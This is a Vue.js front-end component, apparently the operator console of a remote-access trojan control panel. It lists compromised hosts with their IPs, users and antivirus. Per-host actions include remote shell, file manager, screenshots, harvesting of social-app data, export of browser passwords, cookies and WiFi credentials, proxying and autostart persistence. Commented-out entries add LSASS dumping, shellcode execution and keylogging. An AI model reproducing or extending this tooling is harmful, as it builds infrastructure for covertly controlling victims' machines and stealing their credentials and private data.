<template>
  <div class="webconsole">
    <el-table
      v-loading="listLoading"
      element-loading-background="rgba(0, 0, 0, 0.5)"
      :data="clientData"
      border
      height="390px"
      max-height="390px"
    >
      <el-table-column prop="id" label="编号" width="60"></el-table-column>
      <el-table-column :show-overflow-tooltip="true" prop="public_ip" label="公网IP" min-width="130"></el-table-column>
      <el-table-column :show-overflow-tooltip="true" prop="private_ip" label="内网IP" min-width="160"></el-table-column>
      <el-table-column label="延时(双击)" min-width="100">
        <template slot-scope="{row}">
          <template v-if="row.is_sleep">
            <el-input ref="sleep" v-model="row.sleep" size="small" @change="editSleep(row)" />
          </template>
          <span v-else @dblclick="row.is_sleep = !row.is_sleep">{{ row.sleep }}</span>
        </template>
      </el-table-column>
      <el-table-column :show-overflow-tooltip="true" label="响应时间" min-width="90">
        <template slot-scope="{row}">
          <template v-if="Math.round(new Date() / 1000 - row.last_time) < 0">
            {{ 0 + '秒前.' }}
          </template>
          <template v-else>
            {{ Math.round(new Date() / 1000) - row.last_time + '秒前.' }}
          </template>
        </template>
      </el-table-column>
      <el-table-column :show-overflow-tooltip="true" prop="os_version" label="系统版本" min-width="160"></el-table-column>
      <el-table-column :show-overflow-tooltip="true" prop="current_user" label="当前用户" min-width="160"></el-table-column>
      <el-table-column label="IP所在地(双击)" min-width="160">
        <template slot-scope="{row}">
          <template v-if="row.is_note">
            <el-input ref="note" v-model="row.note" size="small" @change="editNote(row)" />
          </template>
          <span v-else @dblclick="row.is_note = !row.is_note">{{ row.note ? row.note : '#' }}</span>
        </template>
      </el-table-column>
      <el-table-column align="center" prop="pid" label="PID" min-width="80"></el-table-column>
      <el-table-column prop="join_time" label="连接时间" min-width="160" :formatter="formatTime"></el-table-column>
      <el-table-column label="杀软(双击)" min-width="160">
        <template slot-scope="{row}">
          <template v-if="row.is_av">
            <el-input v-model="row.av" size="small" @change="editAv(row)" />
          </template>
          <span v-else @dblclick="row.is_av = !row.is_av">{{ row.av ? row.av : '#' }}</span>
        </template>
      </el-table-column>
      <el-table-column align="center" fixed="right" label="操作" width="100">
        <template slot-scope="scope">
          <el-dropdown>
            <el-button size="mini" split-button plain type="primary">
              操作<i class="el-icon-arrow-down el-icon--right"></i>
            </el-button>
            <el-dropdown-menu slot="dropdown">
              <el-dropdown-item @click.native="changeUser(scope.row)">
                <svg-icon icon-class="bp-change-user" /> 切换到用户权限
              </el-dropdown-item>
              <el-dropdown-item @click.native="shell(scope.row)">
                <svg-icon icon-class="bp-console" /> Shell
              </el-dropdown-item>
              <el-dropdown-item @click.native="fileManager(scope.row)">
                <svg-icon icon-class="bp-file-manage" /> 文件管理
              </el-dropdown-item>
              <el-dropdown-item @click.native="screenshotList(scope.row)">
                <svg-icon icon-class="bp-screenshot" /> 截屏
              </el-dropdown-item>
              <el-dropdown-item @click.native="processList(scope.row)">
                <svg-icon icon-class="bp-processor" /> 进程列表
              </el-dropdown-item>
              <el-dropdown-item @click.native="getSocialInfo(scope.row)">
                <svg-icon icon-class="bp-wechat" /> 获取社交信息
              </el-dropdown-item>
              <el-dropdown-item @click.native="share(scope.row)">
                <svg-icon icon-class="bp-share" /> 分享
              </el-dropdown-item>
              <el-dropdown-item @click.native="exportBrowserPwd(scope.row)">
                <svg-icon icon-class="bp-export-browser-log" /> 导出浏览器密码/Cookies
              </el-dropdown-item>
              <el-dropdown-item @click.native="exportBrowserHistory(scope.row)">
                <svg-icon icon-class="bp-history" /> 导出浏览器历史记录
              </el-dropdown-item>
              <!-- 暂时屏蔽  导出Lsass内存 -->
              <!-- <el-dropdown-item @click.native="exportLsass(scope.row)">
                <svg-icon icon-class="bp-exporthash" /> 导出Lsass内存
              </el-dropdown-item> -->
              <el-dropdown-item @click.native="loadNetworkAgent(scope.row)">
                <svg-icon icon-class="bp-network-agent" /> 加载网络代理
              </el-dropdown-item>
              <el-dropdown-item @click.native="exportWifi(scope.row)">
                <svg-icon icon-class="bp-wifi" /> 导出WIFI信息
              </el-dropdown-item>
              <el-dropdown-item @click.native="autoStart(scope.row)">
                <svg-icon icon-class="bp-auto" /> 自动自启
              </el-dropdown-item>
              <!-- <el-dropdown-item @click.native="shellCode(scope.row)">
                <svg-icon icon-class="bp-shellcode" /> 执行ShellCode
              </el-dropdown-item>
              <el-dropdown-item @click.native="keylogger(scope.row)">
                <svg-icon icon-class="bp-keylogger" /> 键盘记录
              </el-dropdown-item>
              <el-dropdown-item @click.native="offline(scope.row)">
                <svg-icon icon-class="bp-delete" /> 下线
              </el-dropdown-item> -->
            </el-dropdown-menu>
          </el-dropdown>
        </template>
      </el-table-column>
    </el-table>
    <!-- 截屏组件 -->
    <screenshot :scdata="scData"></screenshot>
    <!-- 文件管理组件 -->
    <filemanage :fmdata="fmData"></filemanage>
    <!-- 进程列表组件 -->
    <processlist :pldata="plData"></processlist>
    <!-- 社交信息组件 -->
    <snsinfo :snsdata="snsData"></snsinfo>
    <!-- 分享管理组件 -->
    <sharemanage :shdata="shData"></sharemanage>
    <!-- 浏览器密码/cookies组件 -->
    <browserlc :blcdata="blcData"></browserlc>
    <!-- 浏览器密码/cookies组件 -->
    <browserhistory :bhdata="bhData"></browserhistory>
    <!-- LSASS组件 -->
    <lsass :lsadata="lsaData"></lsass>
    <!-- 网络代理组件 -->
    <networkagent :nadata="naData"></networkagent>
    <!-- WIFI信息组件 -->
    <wifiinfo :wifidata="wifiData"></wifiinfo>
  </div>
</template>

<script>
import { getClientList, setSleep, setNote, setAv, submitTask, checkShareClient } from '@/api/consoleApi'
import { getToken } from '@/utils/auth'
import { Message } from 'element-ui'
import NProgress from 'nprogress'
import { parseTime } from '@/utils/common'
import Screenshot from './Screenshot'
import Filemanage from './Filemanage'
import Processlist from './Processlist'
import Snsinfo from './SNSInfo'
import Sharemanage from './Sharemanage'
import Browserlc from './BrowserLC'
import Browserhistory from './Browserhistory'
import Lsass from './Lsass'
import Networkagent from './Networkagent'
import Wifiinfo from './Wifiinfo'
export default {
  name: 'WebConlose',
  components: {
    Screenshot,
    Filemanage,
    Processlist,
    Snsinfo,
    Sharemanage,
    Browserlc,
    Browserhistory,
    Lsass,
    Networkagent,
    Wifiinfo
  },
  data() {
    return {
      // 被控端列表
      clientData: [],
      clienttimer: '',
      listLoading: true,
      token: getToken(),
      // 响应默认60秒,超过60秒的不显示
      timeout: 60,
      // 截屏,向子组件传对象
      scData: {
        'screenshotVisible': false
      },
      // 文件管理,向子组件传对象
      fmData: {
        'filesVisible': false
      },
      // 进程列表,向子组件传对象
      plData: {
        'processVisible': false
      },
      // 社交信息,向子组件传对象
      snsData: {
        'snsVisible': false
      },
      // 分享管理,向子组件传对象
      shData: {
        'shareVisible': false
      },
      // 浏览器密码/cookies,向子组件传对象
      blcData: {
        'browserLCVisible': false
      },
      // 浏览器历史记录,向子组件传对象
      bhData: {
        'browserHistoryVisible': false
      },
      // LSASS内存,向子组件传对象
      lsaData: {
        'lsassVisible': false
      },
      // 网络代理, 向子组件传对象
      naData: {
        'networkVisible': false
      },
      // WIFI信息, 向子组件传对象
      wifiData: {
        'wifiVisible': false
      }
    }
  },
  created() {
    this.getClientList()
  },
  mounted() {
    if (this.clienttimer) {
      clearInterval(this.clienttimer)
    } else {
      this.clienttimer = setInterval(() => {
        this.getClientList()
      }, 30000)
    }
  },
  destroyed() {
    clearInterval(this.clienttimer)
  },
  methods: {
    // 获取被控机器
    getClientList() {
      this.listLoading = true
      getClientList({ token: this.token, timeout: this.timeout }).then(response => {
        this.clientData = response.data.map(v => {
          // 添加两个元素 用户修改延时和备注
          this.$set(v, 'is_sleep', false)
          this.$set(v, 'is_note', false)
          this.$set(v, 'is_av', false)
          return v
        })
        this.listLoading = false
      })
    },
    // 修改延时
    editSleep(row) {
      NProgress.start()
      if (isNaN(parseInt(row.sleep))) {
        Message({
          message: '必须是数字',
          type: 'error',
          duration: 2 * 1000
        })
      } else if (parseInt(row.sleep) < 0) {
        Message({
          message: '必须大于0的数',
          type: 'error',
          duration: 2 * 1000
        })
      } else {
        setSleep({ token: this.token, key: row.key, sleep: row.sleep }).then(response => {
          if (response.code === 20000) {
            row.is_sleep = false
          }
        })
      }
      NProgress.done()
    },
    // 修改备注
    editNote(row) {
      NProgress.start()
      if (row.note.trim().length === 0) {
        Message({
          message: '备注不能为空!',
          type: 'error',
          duration: 2 * 1000
        })
      } else {
        setNote({ token: this.token, key: row.key, note: row.note }).then(response => {
          if (response.code === 20000) {
            row.is_note = false
          }
        })
      }
      NProgress.done()
    },
    // 修改杀软
    editAv(row) {
      NProgress.start()
      if (row.av.trim().length === 0) {
        Message({
          message: '内容不能为空!',
          type: 'error',
          duration: 2 * 1000
        })
      } else {
        setAv({ token: this.token, key: row.key, av: row.av }).then(response => {
          if (response.code === 20000) {
            row.is_av = false
          }
        })
      }
      NProgress.done()
    },
    // 格式化时间戳
    formatTime(row) {
      return parseTime(row.join_time)
    },
    // 切换到用户权限
    changeUser(val) {
      const data = {
        'key': val.key,
        'content': 'switch_to_user',
        'type': 'switch_to_user',
        'token': getToken()
      }
      // 提交
      submitTask(data).then(response => {
        if (response.code === 20000) {
          this.$notify.success({
            title: 'info',
            message: '切换用户指令发送成功!!',
            duration: 2000,
            showClose: false
          })
        }
      })
    },
    // shell
    shell(val) {
      NProgress.start()
      let exist = false // 判断是否有打开的Tabs
      for (var option of this.$store.state.shellTabs.options) {
        if (option.key === val.key) {
          exist = true
          this.$store.commit('shellTabs/set_active_index', val.key)
          break
        }
      }
      if (!exist) {
        this.$store.commit('shellTabs/add_shelltabs', val)
        this.$store.commit('shellTabs/set_active_index', val.key)
      }
      NProgress.done()
    },
    // 文件管理
    fileManager(val) {
      this.$set(this.fmData, 'filesVisible', true)
      this.$set(this.fmData, 'content', 'files')
      this.$set(this.fmData, 'key', val.key)
      this.$set(this.fmData, 'ip', val.public_ip)
      var initdata = {
        'key': val.key,
        'content': 'files',
        'type': 'files',
        'token': getToken()
      }
      // 提交
      submitTask(initdata)
    },
    // 获取截图列表
    screenshotList(val) {
      this.$set(this.scData, 'screenshotVisible', true)
      this.$set(this.scData, 'key', val.key)
      this.$set(this.scData, 'ip', val.public_ip)
    },
    // 进程列表
    processList(val) {
      this.$set(this.plData, 'processVisible', true)
      this.$set(this.plData, 'key', val.key)
      this.$set(this.plData, 'ip', val.public_ip)
    },
    // 获取社交信息
    getSocialInfo(val) {
      this.$set(this.snsData, 'snsVisible', true)
      this.$set(this.snsData, 'key', val.key)
      this.$set(this.snsData, 'ip', val.public_ip)
    },
    // 分享
    share(val) {
      const data = {
        'token': getToken(),
        'key': val.key
      }
      // 分享验证
      checkShareClient(data).then(response => {
        if (response.code === 20000 && response.status === true) {
          this.$set(this.shData, 'shareVisible', true)
          this.$set(this.shData, 'key', val.key)
          this.$set(this.shData, 'ip', val.public_ip)
        } else {
          this.$notify.warning({
            title: '警告',
            message: '非直属机器,不能再分享!',
            duration: 2000,
            showClose: false
          })
        }
      })
    },
    // 导出浏览器密码/Cookies
    exportBrowserPwd(val) {
      this.$set(this.blcData, 'browserLCVisible', true)
      this.$set(this.blcData, 'key', val.key)
      this.$set(this.blcData, 'ip', val.public_ip)
    },
    // 导出浏览器历史记录
    exportBrowserHistory(val) {
      this.$set(this.bhData, 'browserHistoryVisible', true)
      this.$set(this.bhData, 'key', val.key)
      this.$set(this.bhData, 'ip', val.public_ip)
    },
    // 导出LSASS内存
    exportLsass(val) {
      this.$set(this.lsaData, 'lsassVisible', true)
      this.$set(this.lsaData, 'key', val.key)
      this.$set(this.lsaData, 'ip', val.public_ip)
    },
    // 加载网络代理
    loadNetworkAgent(val) {
      this.$set(this.naData, 'networkVisible', true)
      this.$set(this.naData, 'key', val.key)
      this.$set(this.naData, 'ip', val.public_ip)
    },
    // 导出Wifi信息
    exportWifi(val) {
      this.$set(this.wifiData, 'wifiVisible', true)
      this.$set(this.wifiData, 'key', val.key)
      this.$set(this.wifiData, 'ip', val.public_ip)
    },
    // 自动自启
    autoStart(val) {
      this.$message({
        message: val.id + ' 自动自启...',
        type: 'success'
      })
    }
    // shellCode
    // shellCode(val) {
    //   this.$message({
    //     message: val.id + ' 执行shellCode...',
    //     type: 'success'
    //   })
    // },
    // // 键盘记录
    // keylogger(val) {
    //   this.$message({
    //     message: val.id + ' 键盘记录...',
    //     type: 'success'
    //   })
    // },
    // // 下线
    // offline(val) {
    //   this.$message({
    //     message: val.id + ' 下线...',
    //     type: 'success'
    //   })
    // }
  }
}
</script>

<style lang="scss" scoped>
.webconsole {
  padding: 10px;
}
// 修改操作按钮样式
// .el-button--mini {
//   padding: 7px 12px;
//   color: #f80000;
//   border: 1px solid #f80000;
//   &:hover{
//     background-color: #f80000;
//     border: 1px solid #f80000;
//   }
// }
</style>
